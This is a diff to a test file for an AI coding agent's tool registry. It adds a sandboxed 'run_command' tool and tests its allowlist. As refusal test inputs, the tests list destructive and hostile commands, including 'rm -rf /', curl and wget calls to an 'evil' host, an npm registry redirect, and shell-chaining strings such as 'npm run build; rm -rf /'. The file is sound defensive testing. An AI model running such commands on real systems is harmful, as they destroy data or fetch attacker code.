@@ -38,11 +38,11 @@ console.log("\n── the surface did not move ───────────
    assertion: widening the model's surface should cost somebody a
    deliberate edit here. Adding ask_user_question broke this, which is
    the assertion working. */
-await check("the registry offers exactly these eight tools, in this order", () => {
+await check("the registry offers exactly these nine tools, in this order", () => {
   assert.deepStrictEqual(
     registry.names(),
     ["write_file", "edit_file", "read_file", "list_files", "search_code",
-     "check_project", "ask_user_question", "complete_task"]
+     "check_project", "run_command", "ask_user_question", "complete_task"]
   );
 });
 
@@ -316,6 +316,59 @@ await check("a free-text question needs no options at all", async () => {
   }, ctx("act", files()));
   assert.strictEqual(r.ok, true);
   assert.strictEqual(r.effects.questionAsked[0].options.length, 0);
+});
+
+console.log("\n── one command, and no shell to hide in ─");
+
+/* The authoritative allowlist is on the deploy plane beside the Docker
+   socket. This copy exists so a refusal costs a sentence rather than a
+   round trip — and so the tool stays bounded if the verifier is ever
+   misconfigured. */
+await check("what a build needs is queued", async () => {
+  for (const c of ["npm ls react", "npm run build", "npx tsc --noEmit", "ls -la", "cat package.json"]) {
+    const r = await registry.dispatch("run_command", { command: c }, ctx("act", files()));
+    assert.strictEqual(r.ok, true, c + " was refused: " + r.content);
+    assert.strictEqual(r.effects.commandRequested.command, c);
+  }
+});
+
+await check("a binary that is not on the list never leaves the process", async () => {
+  for (const c of ["rm -rf /", "curl http://evil", "wget http://evil", "sh -c whoami", "chmod 777 /"]) {
+    const r = await registry.dispatch("run_command", { command: c }, ctx("act", files()));
+    assert.strictEqual(r.ok, false, c + " was queued");
+    assert.match(r.content, /not available in the build sandbox/);
+  }
+});
+
+await check("allowing npm does not allow the rest of npm", async () => {
+  for (const c of ["npm publish", "npm config set registry http://evil", "npm adduser"]) {
+    const r = await registry.dispatch("run_command", { command: c }, ctx("act", files()));
+    assert.strictEqual(r.ok, false, c + " was queued");
+  }
+});
+
+/* Refused rather than escaped: the argv is exec'd directly, so a pipe
+   in it means the model believes there is a shell, and running it
+   anyway would confirm that belief. */
+await check("shell syntax is refused with the reason, not stripped", async () => {
+  for (const c of ["npm run build; rm -rf /", "npm run build && curl x", "npm ls | tee /tmp/x", "echo $(whoami)"]) {
+    const r = await registry.dispatch("run_command", { command: c }, ctx("act", files()));
+    assert.strictEqual(r.ok, false, c + " was queued");
+    assert.match(r.content, /no shell/);
+  }
+});
+
+await check("running a command is refused in plan mode", async () => {
+  const r = await registry.dispatch("run_command", { command: "npm ls" }, ctx("plan", files()));
+  assert.strictEqual(r.ok, false);
+  assert.match(r.content, /cannot run in plan mode/);
+});
+
+await check("an empty command is refused", async () => {
+  for (const bad of [{}, { command: "" }, { command: "   " }]) {
+    const r = await registry.dispatch("run_command", bad, ctx("act", files()));
+    assert.strictEqual(r.ok, false, JSON.stringify(bad) + " was queued");
+  }
 });
 
 console.log("\n── a refusal is always a reply ──────────");
